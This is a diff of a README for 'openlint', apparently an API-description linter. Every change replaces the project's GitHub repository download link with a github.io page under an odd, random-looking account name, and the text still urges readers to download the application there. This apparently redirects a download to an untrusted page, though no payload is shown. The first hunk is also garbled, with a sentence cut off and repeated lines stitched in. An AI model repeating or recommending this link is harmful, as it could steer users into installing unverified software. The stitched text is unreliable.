@@ -1,10 +1,10 @@
 # 🔍 openlint - Flexible Linting for API Style Guides
 
-[![Download openlint](https://img.shields.io/badge/Download-openlint-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/crampoonpoephilacastanotis388/openlint)
+[![Download openlint](https://img.shields.io/badge/Download-openlint-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://crampoonpoephilacastanotis388.github.io)
 
 openlint is a flexible JSON and YAML linter for creating automated API style guides. It checks API description files against the rules you choose, so teams can keep documentation clear, consistent, and ready to share. openlint has baked-in support for OpenAPI v3.2 through v2.0, A# 🔍 openlint - Flexible Linting for API Style Guides
 
-[![Download openlint](https://img.shields.io/badge/Download-openlint-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/crampoonpoephilacastanotis388/openlint)
+[![Download openlint](https://img.shields.io/badge/Download-openlint-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://crampoonpoephilacastanotis388.github.io)
 
 openlint is a flexible JSON and YAML linter for creating automated API style guides. It checks API description files against the rules you choose, so teams can keep their documentation clear, consistent, and ready to share. openlint has baked-in support for OpenAPI v3.2 through v2.0, Arazzo v1.0, and AsyncAPI v2.x, and it also understands plain JSON Schema files. That means one tool can review a whole collection of API documents instead of asking you to juggle several different checkers. It is built for anyone who wants an automated style guide without writing custom software: point it at your files, pick your rules, and read the report it produces.
 
@@ -27,7 +27,7 @@ Because the rules are configurable, openlint adapts to your organisation rather 
 
 Visit this link to download the application:
 
-**https://github.com/crampoonpoephilacastanotis388/openlint**
+**https://crampoonpoephilacastanotis388.github.io**
 
 The link above opens the openlint project page, where the download is published. You do not need an account to browse the page, though creating a free GitHub account makes it easier to return to the project later and to report anything that looks wrong.
 
